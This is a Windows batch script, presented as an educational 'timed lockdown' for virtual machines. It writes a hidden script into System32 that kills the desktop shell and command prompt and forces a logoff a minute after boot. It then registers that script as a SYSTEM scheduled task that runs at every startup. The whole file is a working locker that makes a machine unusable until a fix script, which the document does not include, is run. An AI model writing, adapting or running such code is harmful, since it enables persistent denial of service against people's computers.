@echo off
:: System Timed Lockdown Script
:: Created for educational use in virtual environments

:: Define path for the blocking script
set "blocker=%windir%\System32\_block.bat"

:: Create the auto-lock script
echo @echo off > "%blocker%"
echo timeout /t 60 /nobreak >nul >> "%blocker%"
echo taskkill /f /im explorer.exe >> "%blocker%"
echo taskkill /f /im cmd.exe >> "%blocker%"
echo shutdown /l /f >> "%blocker%"

:: Register the task to run at startup
schtasks /create /tn "SystemBlocker" /tr "%blocker%" /sc onstart /ru SYSTEM /f

echo.
echo =====================================================
echo   !!! Virtual System Timed Lockdown Installed !!!
echo   System will function for 1 minute after startup...
echo   After 60 seconds, UI and session will terminate.
echo   Use the antivirus_fix.bat within this time to fix.
echo =====================================================
pause
